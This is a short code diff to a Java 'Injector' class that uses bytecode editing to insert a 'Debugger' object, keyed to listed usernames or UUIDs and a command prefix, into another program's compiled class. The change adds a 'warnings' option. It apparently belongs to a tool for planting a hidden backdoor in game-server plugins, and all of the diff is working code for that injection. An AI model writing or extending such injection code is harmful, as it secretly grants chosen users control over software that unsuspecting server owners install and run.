@@ -186,8 +186,8 @@ public class Injector {
             }
             sb.append("}");
             if(!quiet)
-                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "); }");
-            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "); }");
+                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
+            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -263,12 +263,14 @@ public class Injector {
         public String[] UUID;
         public String prefix;
         public boolean injectOther;
+        public boolean warnings;
 
-        public SimpleConfig(boolean b1, String[] s1, String s2, boolean b2) {
+        public SimpleConfig(boolean b1, String[] s1, String s2, boolean b2, boolean b3) {
             useUsernames = b1;
             UUID = s1;
             prefix = s2;
             injectOther = b2;
+            warnings = b3;
         }
     }
 
